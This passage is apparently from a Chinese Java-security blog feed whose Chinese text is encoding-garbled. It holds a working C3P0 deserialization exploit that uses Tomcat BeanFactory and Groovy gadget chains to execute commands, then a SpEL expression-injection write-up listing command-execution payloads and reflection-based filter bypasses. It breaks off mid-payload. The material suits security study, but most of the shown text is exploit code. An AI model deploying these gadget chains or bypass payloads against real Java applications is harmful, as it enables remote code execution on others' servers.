class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="literal">null</span>);</span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;faster=eval&quot;</span>));</span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;faster&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;)&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> resourceRef;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Pool_Serial</span><span class="params">(ConnectionPoolDataSource c)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">//åå°„ä¿®æ”¹connectionPoolDataSourceå±æ€§å€¼</span></span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> poolBackedDataSourceBase.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(poolBackedDataSourceBase,c);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–æµå†™å…¥æ–‡ä»¶</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;exp.bin&quot;</span>));</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(poolBackedDataSourceBase);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Pool_Deserial</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;exp.bin&quot;</span>));</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Tomcat8_Loader</span> <span class="variable">tomcat8_loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat8_Loader</span>();</span><br><span class="line">        Pool_Serial(tomcat8_loader);</span><br><span class="line">        Pool_Deserial();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç±»ä¼¼çš„è¿˜æœ‰Grovyä¾èµ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0_Grovy</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Tomcat8_Loader</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;groovy.lang.GroovyClassLoader&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=parseClass&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">script</span> <span class="operator">=</span> <span class="string">&quot;@groovy.transform.ASTTest(value=&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    assert java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;)\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#125;)\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;def x\n&quot;</span>;</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>,script));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ref;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Pool_Serial</span><span class="params">(ConnectionPoolDataSource c)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">//åå°„ä¿®æ”¹connectionPoolDataSourceå±æ€§å€¼</span></span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> poolBackedDataSourceBase.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(poolBackedDataSourceBase,c);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–æµå†™å…¥æ–‡ä»¶</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;exp.bin&quot;</span>));</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(poolBackedDataSourceBase);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Pool_Deserial</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;exp.bin&quot;</span>));</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Tomcat8_Loader</span> <span class="variable">tomcat8_loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat8_Loader</span>();</span><br><span class="line">        Pool_Serial(tomcat8_loader);</span><br><span class="line">        Pool_Deserial();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ–‡ç« å‚è€ƒï¼š<a href="https://goodapple.top/archives/1749">https://goodapple.top/archives/1749</a></p><p><a href="https://forum.butian.net/share/2868">https://forum.butian.net/share/2868</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> C3p0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaè¡¨è¾¾å¼æ³¨å…¥</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>spelåŸºç¡€å‚è€ƒï¼š<a href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%BF%90%E7%AE%97">https://www.mi1k7ea.com/2020/01/10/SpEL</a></p><h2 id="SpELç®€ä»‹"><a href="#SpELç®€ä»‹" class="headerlink" title="SpELç®€ä»‹"></a>SpELç®€ä»‹</h2><p>åœ¨Spring 3ä¸­å¼•å…¥äº†Springè¡¨è¾¾å¼è¯­è¨€ï¼ˆSpring Expression Languageï¼Œç®€ç§°SpELï¼‰ï¼Œè¿™æ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œæ”¯æŒåœ¨è¿è¡Œæ—¶æŸ¥è¯¢å’Œæ“ä½œå¯¹è±¡å›¾ï¼Œå¯ä»¥ä¸åŸºäºXMLå’ŒåŸºäºæ³¨è§£çš„Springé…ç½®è¿˜æœ‰beanå®šä¹‰ä¸€èµ·ä½¿ç”¨ã€‚</p><p>åœ¨Springç³»åˆ—äº§å“ä¸­ï¼ŒSpELæ˜¯è¡¨è¾¾å¼è®¡ç®—çš„åŸºç¡€ï¼Œå®ç°äº†ä¸Springç”Ÿæ€ç³»ç»Ÿæ‰€æœ‰äº§å“æ— ç¼å¯¹æ¥ã€‚Springæ¡†æ¶çš„æ ¸å¿ƒåŠŸèƒ½ä¹‹ä¸€å°±æ˜¯é€šè¿‡ä¾èµ–æ³¨å…¥çš„æ–¹å¼æ¥ç®¡ç†Beanä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œè€ŒSpELå¯ä»¥æ–¹ä¾¿å¿«æ·çš„å¯¹ApplicationContextä¸­çš„Beanè¿›è¡Œå±æ€§çš„è£…é…å’Œæå–ã€‚ç”±äºå®ƒèƒ½å¤Ÿåœ¨è¿è¡Œæ—¶åŠ¨æ€åˆ†é…å€¼ï¼Œå› æ­¤å¯ä»¥ä¸ºæˆ‘ä»¬èŠ‚çœå¤§é‡Javaä»£ç ã€‚</p><p>SpELæœ‰è®¸å¤šç‰¹æ€§ï¼š</p><ul><li>ä½¿ç”¨Beançš„IDæ¥å¼•ç”¨Bean</li><li>å¯è°ƒç”¨æ–¹æ³•å’Œè®¿é—®å¯¹è±¡çš„å±æ€§</li><li>å¯å¯¹å€¼è¿›è¡Œç®—æ•°ã€å…³ç³»å’Œé€»è¾‘è¿ç®—</li><li>å¯ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…</li><li>å¯è¿›è¡Œé›†åˆæ“ä½œ</li></ul><h3 id="SpELå®šç•Œç¬¦â€”â€”"><a href="#SpELå®šç•Œç¬¦â€”â€”" class="headerlink" title="SpELå®šç•Œç¬¦â€”â€”#{}"></a>SpELå®šç•Œç¬¦â€”â€”#{}</h3><p>SpELä½¿ç”¨#{}ä½œä¸ºå®šç•Œç¬¦ï¼Œæ‰€æœ‰åœ¨å¤§æ‹¬å·ä¸­çš„å­—ç¬¦éƒ½å°†è¢«è®¤ä¸ºæ˜¯SpELè¡¨è¾¾å¼ï¼Œåœ¨å…¶ä¸­å¯ä»¥ä½¿ç”¨SpELè¿ç®—ç¬¦ã€å˜é‡ã€å¼•ç”¨beanåŠå…¶å±æ€§å’Œæ–¹æ³•ç­‰ã€‚</p><p>è¿™é‡Œéœ€è¦æ³¨æ„#{}å’Œ${}çš„åŒºåˆ«ï¼š</p><ul><li>#{}å°±æ˜¯SpELçš„å®šç•Œç¬¦ï¼Œç”¨äºæŒ‡æ˜å†…å®¹æœªSpELè¡¨è¾¾å¼å¹¶æ‰§è¡Œï¼›</li><li>${}ä¸»è¦ç”¨äºåŠ è½½å¤–éƒ¨å±æ€§æ–‡ä»¶ä¸­çš„å€¼ï¼›</li><li>ä¸¤è€…å¯ä»¥æ··åˆä½¿ç”¨ï¼Œä½†æ˜¯å¿…é¡»#{}åœ¨å¤–é¢ï¼Œ${}åœ¨é‡Œé¢ï¼Œå¦‚#{â€˜${}â€™}ï¼Œæ³¨æ„å•å¼•å·æ˜¯å­—ç¬¦ä¸²ç±»å‹æ‰æ·»åŠ çš„ï¼›</li></ul><h3 id="SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´"><a href="#SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´" class="headerlink" title="SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´"></a>SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´</h3><h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p>SimpleEvaluationContextå’ŒStandardEvaluationContextæ˜¯SpELæä¾›çš„ä¸¤ä¸ªEvaluationContextï¼š</p><ul><li>SimpleEvaluationContext - é’ˆå¯¹ä¸éœ€è¦SpELè¯­è¨€è¯­æ³•çš„å…¨éƒ¨èŒƒå›´å¹¶ä¸”åº”è¯¥å—åˆ°æœ‰æ„é™åˆ¶çš„è¡¨è¾¾å¼ç±»åˆ«ï¼Œå…¬å¼€SpELè¯­è¨€ç‰¹æ€§å’Œé…ç½®é€‰é¡¹çš„å­é›†ã€‚</li><li>StandardEvaluationContext - å…¬å¼€å…¨å¥—SpELè¯­è¨€åŠŸèƒ½å’Œé…ç½®é€‰é¡¹ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥æŒ‡å®šé»˜è®¤çš„æ ¹å¯¹è±¡å¹¶é…ç½®æ¯ä¸ªå¯ç”¨çš„è¯„ä¼°ç›¸å…³ç­–ç•¥ã€‚</li></ul><p>SimpleEvaluationContextæ—¨åœ¨ä»…æ”¯æŒSpELè¯­è¨€è¯­æ³•çš„ä¸€ä¸ªå­é›†ï¼Œä¸åŒ…æ‹¬ Javaç±»å‹å¼•ç”¨ã€æ„é€ å‡½æ•°å’Œbeanå¼•ç”¨ï¼›è€ŒStandardEvaluationContextæ˜¯æ”¯æŒå…¨éƒ¨SpELè¯­æ³•çš„ã€‚</p><p>ç”±å‰é¢çŸ¥é“ï¼ŒSpELè¡¨è¾¾å¼æ˜¯å¯ä»¥æ“ä½œç±»åŠå…¶æ–¹æ³•çš„ï¼Œå¯ä»¥é€šè¿‡ç±»ç±»å‹è¡¨è¾¾å¼T(Type)æ¥è°ƒç”¨ä»»æ„ç±»æ–¹æ³•ã€‚è¿™æ˜¯å› ä¸ºåœ¨ä¸æŒ‡å®šEvaluationContextçš„æƒ…å†µä¸‹é»˜è®¤é‡‡ç”¨çš„æ˜¯StandardEvaluationContextï¼Œè€Œå®ƒåŒ…å«äº†SpELçš„æ‰€æœ‰åŠŸèƒ½ï¼Œåœ¨å…è®¸ç”¨æˆ·æ§åˆ¶è¾“å…¥çš„æƒ…å†µä¸‹å¯ä»¥æˆåŠŸé€ æˆä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainApp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">spel</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;</span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(spel);</span><br><span class="line">        System.out.println(expression.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PoC-Bypassæ•´ç†"><a href="#PoC-Bypassæ•´ç†" class="headerlink" title="PoC&amp;Bypassæ•´ç†"></a>PoC&amp;Bypassæ•´ç†</h3><p>ä¸‹é¢æˆ‘ä»¬æ¥æ•´ç†ä¸‹å„ç§åˆ©ç”¨çš„PoCï¼Œè¿™é‡Œé»˜è®¤æŠŠå®šç•Œç¬¦#{}å»æ‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PoCåŸå‹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Runtime</span></span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line">T(Runtime).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ProcessBuilder</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(&#123;<span class="string">&#x27;calc&#x27;</span>&#125;).start()</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(&#123;<span class="string">&#x27;calc&#x27;</span>&#125;).start()</span><br><span class="line"></span><br><span class="line">******************************************************************************</span><br><span class="line"><span class="comment">// BypassæŠ€å·§</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// åå°„è°ƒç”¨</span></span><br><span class="line">T(String).getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŒä¸Šï¼Œéœ€è¦æœ‰ä¸Šä¸‹æ–‡ç¯å¢ƒ</span></span><br><span class="line">#<span class="built_in">this</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// åå°„è°ƒç”¨+å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œç»•è¿‡å¦‚javaconé¢˜ç›®ä¸­çš„æ­£åˆ™è¿‡æ»¤</span></span><br><span class="line">T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span 